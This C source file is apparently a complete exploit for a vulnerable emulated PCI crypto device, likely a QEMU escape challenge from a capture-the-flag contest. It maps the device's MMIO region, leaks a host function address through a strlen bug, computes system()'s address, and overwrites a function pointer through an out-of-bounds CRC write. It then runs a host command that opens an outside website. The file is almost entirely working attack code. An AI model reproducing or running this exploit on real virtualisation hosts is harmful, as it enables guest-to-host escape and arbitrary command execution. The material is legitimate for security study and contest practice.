#include <stdio.h>
#include <fcntl.h>
#include <stdlib.h>
#include <stdint.h>
#include <sys/mman.h>
#include <unistd.h>
#include <string.h>

void *mmap_addr;
int count = 0;

void die(char *mesg){
    perror(mesg);
    exit(-1);
}

void mmio_write(uint32_t addr,char value){
    *((uint8_t *)mmap_addr + addr) = value;
}

uint8_t mmio_read(uint32_t addr){
    return *((uint8_t *)mmap_addr+addr);
}

void set_crypt_key(uint32_t addr,char value){//statu = 3;
    mmio_write(0x1000+addr,value);
}

void set_input_buf(uint32_t addr,char value){//statu = 1;
    mmio_write(0x2000+addr,value);
}

void memset_(){//statu != 5;
    mmio_read(0);//set statu 0;
}

void set_statu_3(){//statu = 2 or 0;
    mmio_read(1);
}

void set_statu_1(){//statu = 4 or 0;
    mmio_read(2);
}

void set_statu_4(){//statu = 3;
    mmio_read(3);
}

void set_statu_2(){//statu = 1;
    mmio_read(4);
}

void set_encrypt_func_aes(){//statu = 2 or 4;
    mmio_read(5);
}

void set_decrypt_func_aes(){//statu = 2 or 4;
    mmio_read(6);
}

void set_encrypt_func_stream(){//statu = 2 or 4;
    mmio_read(7);
}

void set_decrypt_func_stream(){//statu = 2 or 4;
    mmio_read(8);
}

void encrypt_process_create(){//statu = 2 or 4;encrypt_func true
    mmio_read(9);
}

void decrypt_process_create(){//statu = 2 or 4;decrypt_func true
    mmio_read(10);
}

//0x1000 <= addr < 0x2000,statu = 4,read crypt_key[addr]
uint8_t read_crypt_key(uint32_t addr){
    return mmio_read(0x1000+addr);
}

//0x2000 <= addr < 0x3000,statu = 2,read input_buf[addr]
uint8_t read_input_buf(uint32_t addr){
    return mmio_read(0x2000+addr);
}

//addr >= 0x3000,ststu = 6 or 8,read output_buf[addr]
uint8_t read_output_buf(uint32_t addr){
    return mmio_read(0x3000+addr);
}

int main(){
    int fd = open("/sys/devices/pci0000:00/0000:00:04.0/resource0",O_RDWR);
    if(fd == -1){
	die("open error.");
    }

    mmap_addr = mmap(0,0x100000,PROT_READ|PROT_WRITE,MAP_SHARED,fd,0);
    if(mmap_addr == MAP_FAILED){
	die("mmap error.");
    }

    printf("mmap addr: %p\n",mmap_addr);

    //------one-----leak encrypt func addr through the read[output_buf] by put the buf full, the bug "strlen"

    memset_();

    set_statu_3();
    for(count=0;count<0x800;count++){
        set_crypt_key(count,'a');
    }
    
    set_statu_4();
    set_statu_1();
    for(count=0;count<0x800;count++){
        set_input_buf(count,'\x01');
    }

    set_statu_2();
    set_statu_3();
    set_statu_4();
    set_encrypt_func_stream();
    encrypt_process_create();

    sleep(1);//has thread,should wait a seccond

    uint64_t func_addr = 0,tmp;
    for(count=0;count<6;count++){
	tmp = read_output_buf(0x800+count);
	tmp = tmp << (count*8);
        func_addr += tmp;
    }

    //leak the func addr -> elf base -> system plt

    uint64_t elf_base = func_addr - 0x4d2a20;
    uint64_t system_addr = elf_base + 0x2adf80;
    printf("elf base: 0x%lx\n",elf_base);
    printf("system addr: 0x%lx\n",system_addr);
    printf("func addr: 0x%lx\n",func_addr);

    //--------two------xor the system addr in the input buf for the next step. get the data in output area.

    memset_();
    set_statu_3();
    for(count=0;count<0x10;count++){
        set_crypt_key(count,'v');
    }

    set_statu_4();
    set_statu_1();
    for(count=0;count<0x7f8;count++){
        set_input_buf(count,'a');
    }
    for(count=0;count<8;count++){
        set_input_buf(0x7f8+count,(system_addr>>(count*8)&0xFF)^'a');
    }

    set_statu_2();
    set_encrypt_func_aes();
    encrypt_process_create();

    sleep(1);

    uint8_t output[0x800];
    for(count=0;count<0x800;count++){
        output[count] = read_output_buf(count);
    }

    //-------three------write out of bound through the aes_encrypt's crc in the end. write the system addr in the encrypt func.

    memset_();
    set_statu_3();
    for(count=0;count<0x10;count++){
        set_crypt_key(count,'v');
    }

    set_statu_4();
    set_statu_1();
    for(count=0;count<0x800;count++){
        set_input_buf(count,output[count]);
    }

    set_statu_2();
    set_decrypt_func_aes();
    decrypt_process_create();

    sleep(1);

    //-------four------fake the input buf to trigger the system("shell")

    memset_();

    set_statu_1();
    char shell[] = "firefox v1nke.win";
    for(count=0;count<strlen(shell);count++){
        set_input_buf(count,shell[count]);
    }

    set_statu_2();
    encrypt_process_create();
    
    return 0;
}
